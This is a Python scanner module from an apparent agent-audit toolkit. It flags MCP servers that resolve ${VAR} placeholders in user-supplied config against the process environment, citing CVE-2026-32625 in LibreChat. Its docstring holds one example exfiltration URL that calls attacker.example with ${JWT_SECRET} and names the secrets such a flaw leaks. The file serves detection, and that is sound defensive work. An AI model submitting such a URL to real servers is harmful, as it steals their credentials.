"""MCP env-placeholder secret-exfiltration scanner — CVE-2026-32625 class.

Flags an MCP server that resolves ``${VAR}`` / ``$VAR`` placeholders against
its own process environment while handling a user-supplied server config
(typically the URL). An authenticated user can then submit
``https://attacker.example/?k=${JWT_SECRET}`` and the server interpolates its
own secrets into the outbound request.

CVE-2026-32625: LibreChat <= 0.8.3 resolved ``${VAR}`` against ``process.env``
during Zod validation of user-supplied MCP server URLs, leaking ``CREDS_KEY``,
``JWT_SECRET``, ``MONGO_URI`` (CWE-200, CVSS 9.6).

Detection signatures (gated to MCP-context files, low false-positive):
  - TS/JS: a ``.replace(/...${...}.../, ... )`` or ``.replaceAll(...)`` whose
    replacer reads ``process.env``, directly or under a local name
    (``const env = process.env``, ``const { env } = process``).
  - Python: ``os.path.expandvars(<value>)`` (expands ``$VAR``/``${VAR}``
    against ``os.environ``), ``.format(**os.environ)`` /
    ``.format_map(os.environ)``, ``string.Template``'s ``substitute`` and
    ``safe_substitute`` given the environment, and each of these under an
    imported name (``from os.path import expandvars``, ``import os.path as
    osp``, ``from os import environ``).
"""

from __future__ import annotations

import re
from pathlib import Path

from agent_audit_kit.models import Finding
from agent_audit_kit.scanners._helpers import make_finding, in_skip_dir, sub_up_to_last

_RULE_ID = "AAK-MCP-ENV-PLACEHOLDER-EXFIL-001"

# File must look like it handles MCP server config / URLs.
_MCP_CTX_RE = re.compile(
    r"\bmcp\b|modelcontextprotocol|McpServer|StdioServerParameters|"
    r"mcpServers|server[_-]?url|serverUrl",
    re.IGNORECASE,
)

# TS/JS comment stripping (a comment mentioning process.env must not match).
_TS_BLOCK_COMMENT_RE = re.compile(r"/\*.*?\*/", re.DOTALL)
_TS_LINE_COMMENT_RE = re.compile(r"//[^\n]*")

# TS: a `.replace(` whose first arg is a regex/string carrying a ${...}
# placeholder, followed (same call) by a replacer that reads process.env.
# Tolerant of escaping (\$\{ in a regex literal) and whitespace/newlines.
#
# The read for the placeholder stops at the next `.replace(` as well as at `;`.
# With a bare `[^;]*?`, every `.replace(` in a file of them with no `;` read to
# the end of the file: 40,000 characters took 0.63 seconds and the time grew with
# the square. A later `.replace(` reaches the same placeholder itself, so a file matches exactly when it did.
#
# `.replaceAll(` counts as `.replace(` does, and the replacer may read the environment
# under a local name: `const env = process.env;`, `const { env } = process;`,
# `import { env } from "node:process"`. A site is found with a pattern that names no
# alias; the read after its placeholder is matched as any identifier and looked up in
# the file's set of aliases. Splicing every alias into one alternation, as a first
# version did, cost names x sites: 8,000 names and 2,000 sites took 157 s.
_TS_REPLACE = r"\.replace(?:All)?\s*\("
_TS_SITE_RE = re.compile(
    _TS_REPLACE                                        # .replace( or .replaceAll(
    + r"(?:(?!" + _TS_REPLACE + r")[^;])*?\\?\$\\?\{",  # first arg carries a ${ placeholder
    re.DOTALL,
)
# The replacer's read of the environment: `process.env`, or a name read by `[` or `.`.
_TS_ENV_READ_RE = re.compile(r"process\.env|(?<![\w$.])([A-Za-z_$][\w$]*)\s*[\[.]")
_TS_REPLACER_REACH = 200  # how far after the placeholder the read may start, before a `;`


# `const env = process.env` (not `process.env.X`), `const { env, argv } = process`,
# `const { env: e } = process` and `import { env as e } from "process"`.
_TS_ENV_ALIAS_RE = re.compile(r"\b(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*process\s*\.\s*env\b(?!\s*[.\[])")
_TS_ENV_DESTRUCTURE_RE = re.compile(r"\b(?:const|let|var)\s*\{([^{}]{0,200})\}\s*=\s*process\b(?!\s*[.\[])")
_TS_ENV_IMPORT_RE = re.compile(r"\bimport\s*\{([^{}]{0,200})\}\s*from\s*[\"'](?:node:)?process[\"']")
_TS_ENV_BINDING_RE = re.compile(r"(?:^|,)\s*env\s*(?:(?::|\bas\b)\s*([A-Za-z_$][\w$]*))?\s*(?=,|$)")

# Python: expandvars expands $VAR/${VAR} against os.environ.
_PY_EXPANDVARS_RE = re.compile(r"\bos\.path\.expandvars\s*\(")
# The same resolvers under the names a module imports them by: `from os.path import
# expandvars [as ev]`, `import os.path as osp`, `from os import path`, `posixpath` and
# `ntpath`, and `from os import environ [as env]`; plus `string.Template`'s
# `substitute` and `safe_substitute` given the environment.
_PY_FROM_IMPORT_RE = re.compile(r"^[ \t]*from[ \t]+(os\.path|posixpath|ntpath|os)[ \t]+import[ \t]+\(?([^\n#)]{1,400})", re.M)
_PY_IMPORT_AS_RE = re.compile(r"^[ \t]*import[ \t]+(?:os\.path|posixpath|ntpath)[ \t]+as[ \t]+([A-Za-z_]\w*)", re.M)
_PY_IMPORT_NAME_RE = re.compile(r"([A-Za-z_]\w*)(?:[ \t]+as[ \t]+([A-Za-z_]\w*))?")


def _py_import_aliases(text: str) -> tuple[set[str], set[str]]:
    """Callables that are `expandvars`, and names bound to `os.environ`, in ``text``."""
    expanders = {"posixpath.expandvars", "ntpath.expandvars"}
    environs: set[str] = set()
    for match in _PY_IMPORT_AS_RE.finditer(text):
        expanders.add(f"{match.group(1)}.expandvars")
    for match in _PY_FROM_IMPORT_RE.finditer(text):
        module = match.group(1)
        for item in match.group(2).split(","):
            name = _PY_IMPORT_NAME_RE.match(item.strip())
            if name is None:
                continue
            bound = name.group(2) or name.group(1)
            if module != "os" and name.group(1) == "expandvars":
                expanders.add(bound)
            elif module == "os" and name.group(1) == "path":
                expanders.add(f"{bound}.expandvars")
            elif module == "os" and name.group(1) == "environ":
                environs.add(bound)
    return expanders, environs


def _strip_ts_comments(text: str) -> str:
    text = sub_up_to_last(_TS_BLOCK_COMMENT_RE, " ", text, "*/")
    text = _TS_LINE_COMMENT_RE.sub(" ", text)
    return text


def _ts_env_names(text: str) -> tuple[str, ...]:
    """The local names a TS/JS file binds to `process.env`."""
    names = {m.group(1) for m in _TS_ENV_ALIAS_RE.finditer(text)}
    for match in list(_TS_ENV_DESTRUCTURE_RE.finditer(text)) + list(_TS_ENV_IMPORT_RE.finditer(text)):
        for binding in _TS_ENV_BINDING_RE.finditer(match.group(1)):
            names.add(binding.group(1) or "env")
    return tuple(sorted(names))


def _strip_ts_comments_keeping_lines(text: str) -> str:
    """`_strip_ts_comments`, with each block comment's line breaks left in place, so an
    offset in the result is on the same line as in ``text``."""
    text = sub_up_to_last(_TS_BLOCK_COMMENT_RE, lambda m: "\n" * m.group().count("\n") or " ", text, "*/")
    return _TS_LINE_COMMENT_RE.sub(" ", text)


def _ts_resolver(text: str) -> int | None:
    """The offset of the first `.replace(`/`.replaceAll(` site in ``text`` whose
    replacer reads the environment, or None."""
    names = set(_ts_env_names(text))
    for site in _TS_SITE_RE.finditer(text):
        end = site.end()
        stop = text.find(";", end, end + _TS_REPLACER_REACH)
        limit = stop if stop >= 0 else end + _TS_REPLACER_REACH
        for read in _TS_ENV_READ_RE.finditer(text, end, limit + 64):
            if read.start() > limit:
                break
            if read.group(1) is None or read.group(1) in names:
                return site.start()
    return None


def _ts_hit(text: str) -> bool:
    return _ts_resolver(_strip_ts_comments_keeping_lines(text)) is not None


# A call of a bare or once-dotted name, and an environment spread into a template; the
# name each captures is looked up in the file's import aliases (`_py_import_aliases`).
_PY_CALL_RE = re.compile(r"(?<![\w.])([A-Za-z_]\w*(?:\s*\.\s*[A-Za-z_]\w*)?)\s*\(")
_PY_ENV_SPREAD_RE = re.compile(
    r"\.(?:format|substitute|safe_substitute)\s*\(\s*\*\*\s*([A-Za-z_]\w*(?:\s*\.\s*[A-Za-z_]\w*)?)\b"
    r"|\.(?:format_map|substitute|safe_substitute)\s*\(\s*([A-Za-z_]\w*(?:\s*\.\s*[A-Za-z_]\w*)?)\s*\)"
)
_SPACES_RE = re.compile(r"\s+")


def _py_resolver(text: str) -> int | None:
    """The offset of the first call in ``text`` that resolves placeholders against the
    environment, or None. Each candidate is matched once and its name looked up in a
    set, so a file of many aliases costs one pass, not aliases x calls."""
    offsets: list[int] = []
    dotted = _PY_EXPANDVARS_RE.search(text)
    if dotted is not None:
        offsets.append(dotted.start())
    expanders, environs = _py_import_aliases(text)
    environs.add("os.environ")
    for call in _PY_CALL_RE.finditer(text):
        if _SPACES_RE.sub("", call.group(1)) in expanders:
            offsets.append(call.start())
            break
    for spread in _PY_ENV_SPREAD_RE.finditer(text):
        if _SPACES_RE.sub("", spread.group(1) or spread.group(2)) in environs:
            offsets.append(spread.start())
            break
    return min(offsets) if offsets else None


def _py_hit(text: str) -> bool:
    return _py_resolver(text) is not None


_PY_SUFFIXES = (".py",)
_TS_SUFFIXES = (".ts", ".tsx", ".js", ".mjs", ".cjs")


def scan(project_root: Path) -> tuple[list[Finding], set[str]]:
    """Scan for MCP env-placeholder secret exfiltration (CVE-2026-32625 class).

    Args:
        project_root: The root directory of the project to scan.

    Returns:
        A tuple of (list of findings, set of scanned file relative paths).
    """
    findings: list[Finding] = []
    scanned_files: set[str] = set()

    for path in project_root.rglob("*"):
        if path.suffix not in _PY_SUFFIXES + _TS_SUFFIXES:
            continue
        if in_skip_dir(path, project_root):
            continue
        if not path.is_file():
            continue
        try:
            if path.stat().st_size > 1_000_000:
                continue
            text = path.read_text(encoding="utf-8", errors="ignore")
        except OSError:
            continue

        if not _MCP_CTX_RE.search(text):
            continue

        # The line is the resolver's own, from its offset: the first line naming the
        # marker could be an alias, an import or a docstring.
        if path.suffix in _PY_SUFFIXES:
            offset = _py_resolver(text)
            marker = "os.path.expandvars" if "expandvars" in text else "os.environ"
            lined = text
        else:
            lined = _strip_ts_comments_keeping_lines(text)
            offset = _ts_resolver(lined)
            marker = "process.env"
        if offset is None:
            continue
        line_number = lined.count("\n", 0, offset) + 1

        rel_path = str(path.relative_to(project_root))
        scanned_files.add(rel_path)
        findings.append(make_finding(
            _RULE_ID,
            rel_path,
            (
                f"MCP server resolves ${{VAR}} placeholders against the "
                f"process environment ({marker}) while handling a "
                f"user-supplied server config — a user-supplied URL with "
                f"${{SECRET}} exfiltrates the server's own secrets "
                f"(CVE-2026-32625, CWE-200). Do not expand env placeholders "
                f"found inside untrusted config values."
            ),
            line_number,
        ))

    return findings, scanned_files
